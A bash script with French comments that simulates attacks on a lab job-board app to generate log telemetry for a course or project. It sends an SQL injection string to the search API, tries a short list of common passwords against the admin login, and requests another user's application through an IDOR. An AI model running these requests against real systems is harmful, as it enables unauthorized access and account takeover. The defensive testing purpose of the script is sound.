#!/usr/bin/env bash
# ============================================================================
#  Attaque FICTIVE de test — §4.7 du cahier des charges
#  À exécuter UNIQUEMENT sur l'instance de test de l'équipe (laboratoire).
#
#  But : générer de la télémétrie d'attaque visible dans les journaux du backend.
#  Usage :  ./simulate_attack.sh [URL_DE_BASE]
#  Exemple : ./simulate_attack.sh http://localhost:8080
# ============================================================================
set -u
BASE="${1:-http://localhost:8080}"

echo "=== Attaque fictive contre $BASE ==="
echo "(ne lancer que sur VOTRE instance de laboratoire)"
echo

# 1) Injection SQL sur la recherche d'offres (V1)
echo "[1/3] Injection SQL sur /api/jobs/search ..."
curl -s -G "$BASE/api/jobs/search" --data-urlencode "q=' OR 1=1 --" -o /dev/null -w "   -> HTTP %{http_code}\n"

# 2) Brute force de connexion (V5) : plusieurs mots de passe erronés
echo "[2/3] Brute force sur /api/auth/login ..."
for pwd in 123456 password admin azerty qwerty motdepasse; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$BASE/api/auth/login" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"admin@jobboard.local\",\"password\":\"$pwd\"}")
  echo "   -> essai '$pwd' : HTTP $code"
done

# 3) Accès non autorisé (IDOR, V2) : lecture d'une candidature arbitraire
echo "[3/3] Tentative d'accès non autorisé (IDOR) sur /api/applications/2 ..."
curl -s -o /dev/null -w "   -> HTTP %{http_code}\n" "$BASE/api/applications/2"

echo
echo "=== Terminé. Vérifiez les journaux du backend : ==="
echo "   kubectl -n jobboard logs -f deploy/backend"
echo "   (ou)  docker compose logs -f backend"
